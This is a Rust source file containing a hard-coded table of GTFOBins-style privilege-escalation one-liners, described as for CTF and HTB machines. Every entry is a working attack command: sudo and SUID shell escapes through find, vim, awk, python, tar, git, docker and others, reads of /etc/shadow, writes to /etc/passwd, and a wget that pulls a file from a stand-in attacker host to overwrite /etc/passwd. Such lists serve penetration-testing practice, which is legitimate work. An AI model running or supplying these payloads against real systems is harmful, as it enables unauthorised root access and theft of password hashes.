//! Curated offline GTFOBins-style privesc one-liners. Not exhaustive — the
//! common binaries you actually hit on CTF/HTB boxes. Source: gtfobins.github.io.

pub struct Gtfo {
    pub bin: &'static str,
    pub kind: &'static str, // sudo | suid | shell | file-read | file-write | pager | capabilities
    pub code: &'static str,
}

pub const GTFOBINS: &[Gtfo] = &[
    Gtfo { bin: "find", kind: "sudo", code: "sudo find . -exec /bin/sh \\; -quit" },
    Gtfo { bin: "find", kind: "suid", code: "./find . -exec /bin/sh -p \\; -quit" },
    Gtfo { bin: "bash", kind: "suid", code: "./bash -p" },
    Gtfo { bin: "sh", kind: "suid", code: "./sh -p" },
    Gtfo { bin: "vim", kind: "sudo", code: "sudo vim -c ':!/bin/sh'" },
    Gtfo { bin: "vim", kind: "suid", code: "./vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'" },
    Gtfo { bin: "nano", kind: "sudo", code: "sudo nano     # then ^R ^X, run: reset; sh 1>&0 2>&0" },
    Gtfo { bin: "less", kind: "sudo", code: "sudo less /etc/profile     # then: !/bin/sh" },
    Gtfo { bin: "more", kind: "sudo", code: "TERM= sudo more /etc/profile     # then: !/bin/sh" },
    Gtfo { bin: "awk", kind: "sudo", code: "sudo awk 'BEGIN {system(\"/bin/sh\")}'" },
    Gtfo { bin: "gawk", kind: "sudo", code: "sudo gawk 'BEGIN {system(\"/bin/sh\")}'" },
    Gtfo { bin: "python", kind: "sudo", code: "sudo python -c 'import os; os.system(\"/bin/sh\")'" },
    Gtfo { bin: "python", kind: "suid", code: "./python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" },
    Gtfo { bin: "perl", kind: "sudo", code: "sudo perl -e 'exec \"/bin/sh\";'" },
    Gtfo { bin: "ruby", kind: "sudo", code: "sudo ruby -e 'exec \"/bin/sh\"'" },
    Gtfo { bin: "lua", kind: "sudo", code: "sudo lua -e 'os.execute(\"/bin/sh\")'" },
    Gtfo { bin: "node", kind: "sudo", code: "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'" },
    Gtfo { bin: "env", kind: "sudo", code: "sudo env /bin/sh" },
    Gtfo { bin: "tar", kind: "sudo", code: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
    Gtfo { bin: "zip", kind: "sudo", code: "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'" },
    Gtfo { bin: "man", kind: "sudo", code: "sudo man man     # then: !/bin/sh" },
    Gtfo { bin: "ftp", kind: "sudo", code: "sudo ftp     # then: !/bin/sh" },
    Gtfo { bin: "gdb", kind: "sudo", code: "sudo gdb -nx -ex '!sh' -ex quit" },
    Gtfo { bin: "make", kind: "sudo", code: "sudo make -s --eval=$'x:\\n\\t-/bin/sh'" },
    Gtfo { bin: "docker", kind: "shell", code: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
    Gtfo { bin: "systemctl", kind: "pager", code: "sudo systemctl status trusted     # in pager: !sh" },
    Gtfo { bin: "journalctl", kind: "pager", code: "sudo journalctl     # in pager: !/bin/sh" },
    Gtfo { bin: "git", kind: "sudo", code: "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help" },
    Gtfo { bin: "cp", kind: "file-read", code: "LFILE=/etc/shadow; cp \"$LFILE\" /dev/stdout" },
    Gtfo { bin: "cat", kind: "sudo", code: "sudo cat /etc/shadow" },
    Gtfo { bin: "base64", kind: "file-read", code: "LFILE=/etc/shadow; base64 \"$LFILE\" | base64 -d" },
    Gtfo { bin: "dd", kind: "file-write", code: "echo 'data' | sudo dd of=/etc/passwd" },
    Gtfo { bin: "tee", kind: "file-write", code: "echo 'data' | sudo tee -a /etc/passwd" },
    Gtfo { bin: "rsync", kind: "sudo", code: "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null" },
    Gtfo { bin: "nmap", kind: "sudo", code: "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; sudo nmap --script=/tmp/x.nse" },
    Gtfo { bin: "apt", kind: "sudo", code: "sudo apt-get changelog apt     # in pager: !/bin/sh" },
    Gtfo { bin: "wget", kind: "file-write", code: "sudo wget http://LHOST/file -O /etc/passwd" },
    Gtfo { bin: "sed", kind: "sudo", code: "sudo sed -n '1e exec sh 1>&0' /etc/hosts" },
];
